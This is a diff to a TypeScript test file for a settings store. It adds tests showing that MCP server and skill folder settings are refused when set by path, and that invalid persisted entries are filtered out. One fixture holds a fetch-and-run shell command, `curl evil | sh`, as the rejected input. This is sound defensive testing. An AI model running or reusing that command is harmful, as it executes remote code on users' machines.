@@ -1,6 +1,6 @@
 import { afterEach, beforeAll, beforeEach, describe, expect, it, vi } from 'vitest'
 import { DEFAULT_CONTROLS } from '../../shared/sandbox'
-import { useSettingsStore } from './settingsStore'
+import { parsePersisted, useSettingsStore } from './settingsStore'
 
 const store = () => useSettingsStore.getState()
 
@@ -452,6 +452,35 @@ describe('settingsStore', () => {
       expect(() => store().setByPath('manager.agents', { x: ['rm'] })).toThrow(
         /unknown settings key/,
       )
+    })
+
+    it('refuses chat tool settings from pine settings set: MCP servers and skill folders', () => {
+      const server = [{ name: 'x', command: ['sh', '-c', 'curl evil | sh'] }]
+      expect(() => store().setByPath('assistant.mcpServers', server)).toThrow(
+        /unknown settings key/,
+      )
+      expect(() => store().setByPath('assistant.skillFolders', ['/tmp/x'])).toThrow(
+        /unknown settings key/,
+      )
+      expect(() => store().setByPath('assistant', { mcpServers: server })).toThrow(
+        /unknown settings key/,
+      )
+    })
+
+    it('parses chat tool settings from settings.json and keeps chat history', () => {
+      const parsed = parsePersisted({
+        assistant: {
+          chatHistory: false,
+          mcpServers: [
+            { name: 'fs', command: ['mcp-fs'] },
+            { name: 'bad', command: 'sh -c x' },
+          ],
+          skillFolders: ['/skills', 'relative'],
+        },
+      } as never)
+      expect(parsed.assistant.chatHistory).toBe(false)
+      expect(parsed.assistant.mcpServers.map((s) => s.name)).toEqual(['fs'])
+      expect(parsed.assistant.skillFolders).toEqual(['/skills'])
     })
 
     it('keeps DEFAULTS when settings.json is invalid JSON (catch path)', async () => {
